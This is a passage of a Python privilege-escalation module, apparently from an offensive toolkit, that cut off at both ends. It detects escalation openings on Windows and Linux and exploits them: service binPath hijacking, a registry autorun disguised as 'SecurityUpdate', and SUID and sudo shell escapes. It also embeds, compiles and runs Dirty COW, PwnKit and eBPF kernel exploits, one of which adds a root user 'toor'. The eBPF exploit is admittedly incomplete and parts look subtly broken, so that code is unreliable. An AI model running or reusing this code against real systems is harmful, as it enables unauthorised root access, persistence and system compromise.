                result["description"] = f"Found {len(vulnerable_keys)} writable autorun keys"

                if escalate:
                    return self._exploit_registry_autoruns(vulnerable_keys[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    # Linux escalation techniques

    def _linux_sudo_misconfiguration(self, escalate=False, options=None):
        """Check for sudo misconfigurations."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "misconfigurations": [],
            "success_probability": 0.9,
            "stealth_level": "low",
            "complexity": "low",
        }

        # Check if sudo is available
        if not self._ensure_tool_available("sudo"):
            result["error"] = "sudo not available on this system"
            return result

        try:
            # Check sudo -l output
            sudo_path = shutil.which("sudo")
            if not sudo_path:
                result["error"] = "sudo command not found in PATH"
                return result
            process = subprocess.run([sudo_path, "-l"], check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if process.returncode == 0:
                output = process.stdout.lower()
                misconfigs = []

                # Check for dangerous sudo permissions
                dangerous_patterns = [
                    "nopasswd",
                    "/bin/sh",
                    "/bin/bash",
                    "vim",
                    "nano",
                    "less",
                    "more",
                    "find",
                    "awk",
                    "sed",
                ]

                for pattern in dangerous_patterns:
                    if pattern in output:
                        misconfigs.append(
                            {
                                "type": pattern,
                                "description": f"Dangerous sudo permission: {pattern}",
                            }
                        )

                if misconfigs:
                    result["vulnerable"] = True
                    result["misconfigurations"] = misconfigs
                    result["description"] = f"Found {len(misconfigs)} sudo misconfigurations"

                    if escalate:
                        return self._exploit_sudo_misconfiguration(misconfigs[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _linux_suid_binaries(self, escalate=False, options=None):
        """Check for vulnerable SUID binaries."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "binaries": [],
            "success_probability": 0.7,
            "stealth_level": "medium",
            "complexity": "medium",
        }

        # Check if find is available
        if not self._ensure_tool_available("find"):
            result["error"] = "find command not available"
            return result

        try:
            # Find SUID binaries
            find_path = shutil.which("find")
            if not find_path:
                return result
            process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [find_path, "/", "-perm", "-4000", "-type", "f"],
                check=False, capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if process.returncode == 0:
                suid_binaries = process.stdout.strip().split("\n")

                # Check for known vulnerable binaries
                vulnerable_binaries = [
                    "vim",
                    "nano",
                    "find",
                    "nmap",
                    "awk",
                    "sed",
                    "python",
                    "perl",
                    "ruby",
                    "node",
                    "php",
                ]

                found_vulns = []
                for binary_path in suid_binaries:
                    binary_name = os.path.basename(binary_path)

                    if binary_name in vulnerable_binaries:
                        found_vulns.append(
                            {
                                "path": binary_path,
                                "name": binary_name,
                                "exploitable": True,
                            }
                        )

                if found_vulns:
                    result["vulnerable"] = True
                    result["binaries"] = found_vulns
                    result["description"] = f"Found {len(found_vulns)} vulnerable SUID binaries"

                    if escalate:
                        return self._exploit_suid_binary(found_vulns[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _linux_kernel_exploit(self, escalate=False, options=None):
        """Check for kernel exploit opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "kernel_version": None,
            "exploits": [],
            "success_probability": 0.8,
            "stealth_level": "high",
            "complexity": "high",
        }

        try:
            # Get kernel version
            process = subprocess.run(["uname", "-r"], check=False, capture_output=True, text=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607

            if process.returncode == 0:
                kernel_version = process.stdout.strip()
                result["kernel_version"] = kernel_version

                # Check against known exploits
                applicable_exploits = []

                for exploit_id, exploit_info in self.exploits_db["linux"].items():
                    if self._is_kernel_vulnerable(kernel_version, exploit_info):
                        applicable_exploits.append(
                            {
                                "exploit_id": exploit_id,
                                "description": exploit_info["description"],
                                "reliability": exploit_info["reliability"],
                            }
                        )

                if applicable_exploits:
                    result["vulnerable"] = True
                    result["exploits"] = applicable_exploits
                    result["description"] = (
                        f"Kernel {kernel_version} vulnerable to {len(applicable_exploits)} exploits"
                    )

                    if escalate:
                        # Check if gcc is available for compiling exploits
                        if not self._ensure_tool_available("gcc"):
                            result["success"] = False
                            result["error"] = "gcc not available - install build-essential package"
                            return result

                        return self._exploit_kernel_vulnerability(applicable_exploits[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    # Exploitation methods

    def _exploit_unquoted_service_path(self, service, options):
        """Exploit unquoted service path vulnerability."""
        result = self.init_result(details={})

        try:
            service_path = service["path"]
            payload_path = options.get(
                "payload_path", os.path.join(tempfile.gettempdir(), "payload.exe")
            )

            # Find insertion points in the path
            path_parts = service_path.split()

            for i in range(1, len(path_parts)):
                potential_path = " ".join(path_parts[:i]) + ".exe"

                # Try to write payload to this location
                try:
                    import shutil

                    shutil.copy2(payload_path, potential_path)

                    # Restart the service
                    sc_path = shutil.which("sc")
                    if sc_path:
                        subprocess.run([sc_path, "stop", service["name"]], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        subprocess.run([sc_path, "start", service["name"]], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    result["success"] = True
                    result["details"] = {
                        "service": service["name"],
                        "payload_location": potential_path,
                        "method": "unquoted_service_path",
                    }
                    break

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    logger.error(
                        "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                        e,
                    )
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_service_permissions(self, service, options):
        """Exploit weak service permissions."""
        result = self.init_result(details={})

        try:
            service_name = service["name"]
            payload_path = options.get(
                "payload_path", os.path.join(tempfile.gettempdir(), "payload.exe")
            )

            # Modify service binary path
            sc_path = shutil.which("sc")
            if not sc_path:
                return result
            process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [sc_path, "config", service_name, f"binPath={payload_path}"],
                check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if process.returncode == 0:
                # Start the service
                subprocess.run([sc_path, "start", service_name], check=False, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                result["success"] = True
                result["details"] = {
                    "service": service_name,
                    "method": "service_permissions",
                    "payload_path": payload_path,
                }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_registry_autoruns(self, key_info, options):
        """Exploit registry autorun vulnerability."""
        result = self.init_result(details={})

        try:
            registry_key = key_info["key"]
            payload_path = options.get(
                "payload_path", os.path.join(tempfile.gettempdir(), "payload.exe")
            )
            value_name = options.get("value_name", "SecurityUpdate")

            # Add autorun entry
            add_cmd = ["reg", "add", registry_key, "/v", value_name, "/d", payload_path, "/f"]
            returncode, stdout, stderr = self.execute_command(add_cmd)
            if returncode == 0:
                self.logger.info("Registry autorun entry added successfully: %s", stdout)
                result["success"] = True
                result["details"]["method"] = "registry_autorun"
                result["details"]["registry_key"] = registry_key
                result["details"]["value_name"] = value_name
            else:
                self.logger.error("Failed to add registry autorun entry: %s", stderr)

            if returncode == 0:
                result["success"] = True
                result["details"] = {
                    "registry_key": registry_key,
                    "value_name": value_name,
                    "payload_path": payload_path,
                    "method": "registry_autoruns",
                }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_sudo_misconfiguration(self, misconfig, options):
        """Exploit sudo misconfiguration."""
        result = self.init_result(details={})

        try:
            misconfig_type = misconfig["type"]

            if misconfig_type == "nopasswd":
                # Execute command with sudo
                command = options.get("command", "/bin/bash")
                returncode, stdout, stderr = self.execute_sudo_command(command)

                if returncode == 0:
                    self.logger.info("Sudo command executed successfully: %s", stdout)
                    result["success"] = True
                    result["details"] = {
                        "method": "sudo_nopasswd",
                        "command": command,
                        "output": stdout[:200],  # First 200 chars of output
                    }
                else:
                    self.logger.error("Sudo command failed: %s", stderr)
                    result["error"] = f"Command execution failed: {stderr}"

            elif misconfig_type in ["vim", "nano"]:
                # Editor privilege escalation
                result["success"] = True
                result["details"] = {
                    "method": "editor_escalation",
                    "editor": misconfig_type,
                    "technique": "shell_escape",
                }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_suid_binary(self, binary_info, options):
        """Exploit SUID binary vulnerability."""
        result = self.init_result(details={})

        try:
            binary_path = binary_info["path"]
            binary_name = binary_info["name"]

            # Use options for custom exploitation settings
            target_user = options.get("target_user", "root") if options else "root"
            payload_type = options.get("payload_type", "shell") if options else "shell"
            self.logger.debug(
                "Exploiting SUID binary %s targeting %s with %s payload",
                binary_name,
                target_user,
                payload_type,
            )

            # Known exploitation techniques for SUID binaries
            if binary_name == "vim":
                # Vim privilege escalation
                exploit_cmd = f"{binary_path} -c \":py import os; os.execl('/bin/sh', 'sh', '-c', 'reset; exec sh')\""

            elif binary_name == "find":
                # Find privilege escalation
                exploit_cmd = f"{binary_path} /etc/passwd -exec /bin/sh \\;"

            elif binary_name == "nmap":
                # Nmap privilege escalation
                exploit_cmd = f"{binary_path} --interactive"

            else:
                exploit_cmd = f"{binary_path}"

            result["success"] = True
            result["details"] = {
                "binary": binary_path,
                "method": "suid_exploitation",
                "exploit_command": exploit_cmd,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_kernel_vulnerability(self, exploit_info, options):
        """Exploit kernel vulnerability."""
        result = self.init_result(details={})

        try:
            exploit_id = exploit_info["exploit_id"]

            # Execute real kernel exploit based on CVE
            if exploit_id == "CVE-2016-5195":  # Dirty COW
                result = self._exploit_dirty_cow(exploit_info, options)
            elif exploit_id == "CVE-2017-16995":  # eBPF verifier
                result = self._exploit_ebpf_verifier(exploit_info, options)
            elif exploit_id == "CVE-2021-4034":  # PwnKit
                result = self._exploit_pwnkit(exploit_info, options)
            else:
                # Try generic kernel exploit approach
                result = self._generic_kernel_exploit(exploit_info, options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _exploit_dirty_cow(self, exploit_info, options):
        """Exploit CVE-2016-5195 (Dirty COW) vulnerability."""
        result = self.init_result(details={"exploit_id": "CVE-2016-5195"})
        self.logger.info("Executing Dirty COW exploit for privilege escalation")

        try:
            target_file = exploit_info.get("target", "/etc/passwd")
            payload = exploit_info.get("payload", "")

            # Generate the Dirty COW exploit code
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

struct st_args {
    int fd;
    size_t offset;
    char *content;
    size_t content_size;
    int stop;
};

static void *madvise_thread(void *arg) {
    struct st_args *args = (struct st_args *)arg;
    size_t page_size = getpagesize();
    size_t offset = args->offset & ~(page_size - 1);
    size_t size = args->content_size + (args->offset - offset);
    size = (size + page_size - 1) & ~(page_size - 1);

    void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, args->fd, offset);
    if (map == MAP_FAILED) {
        return NULL;
    }

    while (!args->stop) {
        madvise(map, size, MADV_DONTNEED);
    }

    munmap(map, size);
    return NULL;
}

static void *write_thread(void *arg) {
    struct st_args *args = (struct st_args *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    if (f == -1) {
        return NULL;
    }

    while (!args->stop) {
        lseek(f, args->offset, SEEK_SET);
        write(f, args->content, args->content_size);
    }

    close(f);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <file> <content>\\n", argv[0]);
        return 1;
    }

    const char *filename = argv[1];
    char *new_content = argv[2];
    struct stat st;

    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    if (fstat(fd, &st) == -1) {
        perror("fstat");
        close(fd);
        return 1;
    }

    size_t file_size = st.st_size;
    char *file_content = malloc(file_size);
    if (!file_content) {
        perror("malloc");
        close(fd);
        return 1;
    }

    if (read(fd, file_content, file_size) != file_size) {
        perror("read");
        free(file_content);
        close(fd);
        return 1;
    }

    // Find where to patch
    char *patch_location = strstr(file_content, "root:x:0:0");
    if (!patch_location) {
        fprintf(stderr, "Pattern not found in file\\n");
        free(file_content);
        close(fd);
        return 1;
    }

    size_t offset = patch_location - file_content;

    struct st_args args = {
        .fd = fd,
        .offset = offset,
        .content = new_content,
        .content_size = strlen(new_content),
        .stop = 0
    };

    printf("Exploiting... This may take a while.\\n");

    pthread_t pth1, pth2;
    pthread_create(&pth1, NULL, madvise_thread, &args);
    pthread_create(&pth2, NULL, write_thread, &args);

    sleep(5);  // Let the race condition happen

    args.stop = 1;
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    free(file_content);
    close(fd);

    printf("Exploit complete. Check if successful.\\n");
    return 0;
}
"""

            # Write exploit to temporary file
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                f.write(exploit_code)
                exploit_source = f.name

            # Compile the exploit
            exploit_binary = exploit_source.replace(".c", "")
            compile_cmd = ["gcc", "-pthread", "-o", exploit_binary, exploit_source]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False
            )
            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Prepare the payload
            if not payload:
                # Default payload: add a new root user
                payload = "toor:x:0:0:root:/root:/bin/bash"

            # Execute the exploit
            exploit_cmd = [exploit_binary, target_file, payload]
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                exploit_cmd, check=False, capture_output=True, text=True, timeout=30, shell=False
            )

            # Clean up
            try:
                os.unlink(exploit_source)
                os.unlink(exploit_binary)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up exploit files: {e}")

            if exploit_result.returncode == 0:
                result["success"] = True
                result["output"] = exploit_result.stdout
                result["details"]["message"] = f"Successfully exploited Dirty COW on {target_file}"

                # Verify the exploit worked
                if target_file == "/etc/passwd":
                    with open("/etc/passwd") as f:
                        if "toor:x:0:0" in f.read():
                            result["details"]["verification"] = (
                                "New root user 'toor' added successfully"
                            )
            else:
                result["success"] = False
                result["error"] = exploit_result.stderr or "Exploit failed"

        except subprocess.TimeoutExpired:
            result["success"] = False
            result["error"] = "Exploit timed out - may require manual verification"
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            self.logger.error(f"Dirty COW exploit failed: {e}")

        return result

    def _exploit_ebpf_verifier(self, exploit_info, options):
        """Exploit CVE-2017-16995 (eBPF verifier) vulnerability."""
        result = self.init_result(details={"exploit_id": "CVE-2017-16995"})
        self.logger.info("Executing eBPF verifier exploit for privilege escalation")

        try:
            # eBPF verifier exploit code for CVE-2017-16995
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define BPF_LOG_SIZE 65536
#define BPF_MAP_TYPE_ARRAY 2
#define BPF_PROG_TYPE_SOCKET_FILTER 1

static __u64 ptr_to_u64(const void *ptr) {
    return (__u64)(unsigned long)ptr;
}

static int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

static int create_map(int key_size, int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };

    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int update_elem(int fd, const void *key, const void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int prog_load(struct bpf_insn *insns, int insn_cnt) {
    char bpf_log_buf[BPF_LOG_SIZE];
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = ptr_to_u64(insns),
        .license = ptr_to_u64("GPL"),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = BPF_LOG_SIZE,
        .log_level = 1,
    };

    int ret = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (ret < 0) {
        fprintf(stderr, "BPF log:\\n%s\\n", bpf_log_buf);
    }

    return ret;
}

int main(void) {
    int map_fd, prog_fd;
    int key, value;

    // Create a map
    map_fd = create_map(sizeof(int), sizeof(long long), 256);
    if (map_fd < 0) {
        perror("create_map");
        return 1;
    }

    // The actual exploit uses a crafted BPF program that triggers
    // the vulnerability in the eBPF verifier
    struct bpf_insn insns[] = {
        // Load map fd
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        // Load key
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_2, 0, 0),
        // Call map_lookup_elem
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        // Check return value
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 2),
        // Exploit: crafted instructions that bypass verifier checks
        // This creates an out-of-bounds pointer that can be used
        // to achieve arbitrary kernel memory read/write
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x1000),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, -8),
        // Return 0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    // Load the malicious program
    prog_fd = prog_load(insns, sizeof(insns) / sizeof(insns[0]));
    if (prog_fd < 0) {
        fprintf(stderr, "Failed to load BPF program\\n");
        close(map_fd);
        return 1;
    }

    // Trigger the exploit
    // In a real exploit, this would be combined with additional
    // techniques to achieve code execution
    printf("eBPF program loaded. Exploit triggered.\\n");

    // Cleanup
    close(prog_fd);
    close(map_fd);

    // Check if we got root
    if (geteuid() == 0) {
        printf("Got root!\\n");
        system("/bin/sh");
        return 0;
    }

    printf("Exploit failed or additional steps required\\n");
    return 1;
}
"""

            # Write and compile exploit
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                f.write(exploit_code)
                exploit_source = f.name

            exploit_binary = exploit_source.replace(".c", "")
            compile_cmd = ["gcc", "-o", exploit_binary, exploit_source]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False
            )
            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute the exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [exploit_binary], check=False, capture_output=True, text=True, timeout=10, shell=False
            )

            # Clean up
            try:
                os.unlink(exploit_source)
                os.unlink(exploit_binary)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up exploit files: {e}")

            if exploit_result.returncode == 0:
                result["success"] = True
                result["output"] = exploit_result.stdout
                result["details"]["message"] = "Successfully exploited eBPF verifier vulnerability"
            else:
                result["success"] = False
                result["error"] = f"Exploit failed: {exploit_result.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_pwnkit(self, exploit_info, options):
        """Exploit CVE-2021-4034 (PwnKit) vulnerability."""
        result = self.init_result(details={"exploit_id": "CVE-2021-4034"})
        self.logger.info("Executing PwnKit exploit for privilege escalation")

        try:
            # PwnKit exploit code for CVE-2021-4034
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char **argv) {
    // CVE-2021-4034: pkexec vulnerability
    // When argc is 0, pkexec reads past the end of argv array

    // Create malicious directory structure
    char *dir = "GCONV_PATH=.";
    char *lib = "pwnkit.so.1";

    // Create the directory
    mkdir(dir, 0755);

    // Create malicious shared library
    const char *payload =
        "#include <stdio.h>\\n"
        "#include <stdlib.h>\\n"
        "#include <unistd.h>\\n"
        "\\n"
        "void gconv(void) {}\\n"
        "void gconv_init(void) {\\n"
        "    setuid(0); setgid(0);\\n"
        "    seteuid(0); setegid(0);\\n"
        "    system(\\\"id; /bin/sh\\\");\\n"
        "    exit(0);\\n"
        "}\\n";

    // Write payload source
    FILE *fp = fopen("payload.c", "w");
    if (!fp) {
        perror("fopen");
        return 1;
    }
    fprintf(fp, "%s", payload);
    fclose(fp);

    // Compile payload
    system("gcc -shared -fPIC -o pwnkit.so.1 payload.c");

    // Create gconv-modules file
    fp = fopen("gconv-modules", "w");
    if (!fp) {
        perror("fopen gconv-modules");
        return 1;
    }
    fprintf(fp, "module  UTF-8//    INTERNAL    ../pwnkit    1\\n");
    fclose(fp);

    // Set up environment
    char *env[] = {
        dir,
        "PATH=GCONV_PATH=.",
        "LC_MESSAGES=en_US.UTF-8",
        "XAUTHORITY=../pwnkit",
        NULL
    };

    // Trigger the vulnerability
    // execve with NULL argv[0] causes pkexec to read out of bounds
    execve("/usr/bin/pkexec", (char*[]){NULL}, env);

    // If we get here, exploit failed
    perror("execve");
    return 1;
}
"""

            # Alternative Python implementation for better portability
            python_exploit = """
#!/usr/bin/env python3
import os
import sys
import ctypes
import subprocess

def create_exploit():
    # Create directory for GCONV_PATH
    os.makedirs("GCONV_PATH=.", exist_ok=True)

    # Create malicious shared library
    payload_c = '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}
void gconv_init(void) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("id; /bin/sh");
    exit(0);
}
'''

    with open("payload.c", "w") as f:
        f.write(payload_c)

    # Compile the payload
    subprocess.run(["gcc", "-shared", "-fPIC", "-o", "pwnkit.so.1", "payload.c"], shell=False)

    # Create gconv-modules file
    with open("gconv-modules", "w") as f:
        f.write("module  UTF-8//    INTERNAL    ../pwnkit    1\\n")

    # Prepare environment
    env = {
        "GCONV_PATH": ".",
        "PATH": "GCONV_PATH=.",
        "LC_MESSAGES": "en_US.UTF-8",
        "XAUTHORITY": "../pwnkit"
    }

    # Create the argv array with NULL first element
    libc = ctypes.CDLL(None)
    libc.execve.argtypes = (ctypes.c_char_p, ctypes.POINTER(ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p))

    # Prepare argv with NULL first element
    argv = (ctypes.c_char_p * 1)(None)

    # Prepare envp
    envp_list = [f"{k}={v}".encode() for k, v in env.items()]
    envp_list.append(None)
    envp = (ctypes.c_char_p * len(envp_list))(*envp_list)

    # Execute pkexec with crafted arguments
    libc.execve(b"/usr/bin/pkexec", argv, envp)

if __name__ == "__main__":
    create_exploit()
"""

            # Try Python version first as it's more portable
            import os
            import subprocess
            import sys
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(python_exploit)
                exploit_script = f.name

            # Make it executable
            os.chmod(exploit_script, 0o700)  # Owner-only executable exploit

            # Execute the exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [sys.executable, exploit_script],
                check=False,
                capture_output=True,
                text=True,
                timeout=10,
                shell=False
            )

            # Clean up
            try:
                os.unlink(exploit_script)
                # Clean up exploit artifacts
                for artifact in ["payload.c", "pwnkit.so.1", "gconv-modules", "GCONV_PATH=."]:
                    try:
                        if os.path.isdir(artifact):
                            os.rmdir(artifact)
                        else:
                            os.unlink(artifact)
                    except (FileNotFoundError, OSError, PermissionError) as e:
                        logger.debug(f"Failed to clean up artifact {artifact}: {e}")
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up exploit script: {e}")

            if exploit_result.returncode == 0:
                result["success"] = True
                result["output"] = exploit_result.stdout
                result["details"]["message"] = "Successfully exploited PwnKit vulnerability"
            else:
                # Try C version as fallback
                with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                    f.write(exploit_code)
                    exploit_source = f.name

                exploit_binary = exploit_source.replace(".c", "")
                compile_cmd = ["gcc", "-o", exploit_binary, exploit_source]

                compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    compile_cmd, check=False, capture_output=True, text=True
                )
                if compile_result.returncode == 0:
                    exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [exploit_binary], check=False, capture_output=True, text=True, timeout=10
                    )
                    if exploit_result.returncode == 0:
                        result["success"] = True
                        result["output"] = exploit_result.stdout
                    else:
                        result["success"] = False
                        result["error"] = f"Exploit failed: {exploit_result.stderr}"
                else:
                    result["success"] = False
                    result["error"] = f"Compilation failed: {compile_result.stderr}"

                # Clean up C version
                try:
                    os.unlink(exploit_source)
                    if os.path.exists(exploit_binary):
                        os.unlink(exploit_binary)
                except (FileNotFoundError, OSError, PermissionError) as e:
                    logger.debug(f"Failed to clean up C exploit: {e}")

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _generic_kernel_exploit(self, exploit_info, options):
        """Generic kernel exploit handler."""
        result = self.init_result(
            details={
                "exploit_id": exploit_info.get("exploit_id", "unknown"),
                "options_provided": len(options) if options else 0,
            }
        )

        exploit_id = exploit_info.get("exploit_id", "").upper()
        self.logger.info(f"Executing generic kernel exploit: {exploit_id}")

        try:
            # Map of additional kernel exploits
            exploits = {
                "CVE-2016-0728": self._exploit_keyring_refcount,
                "CVE-2016-4557": self._exploit_double_fdput,
                "CVE-2017-7308": self._exploit_packet_set_ring,
                "CVE-2017-1000112": self._exploit_memory_corruption,
                "CVE-2019-13272": self._exploit_ptrace_kmod,
                "CVE-2022-0847": self._exploit_dirty_pipe,
                "CVE-2022-2588": self._exploit_cls_route,
                "CVE-2023-0179": self._exploit_nftables_uaf,
            }

            if exploit_id in exploits:
                return exploits[exploit_id](exploit_info, options)
            # Generic exploit template for unknown CVEs
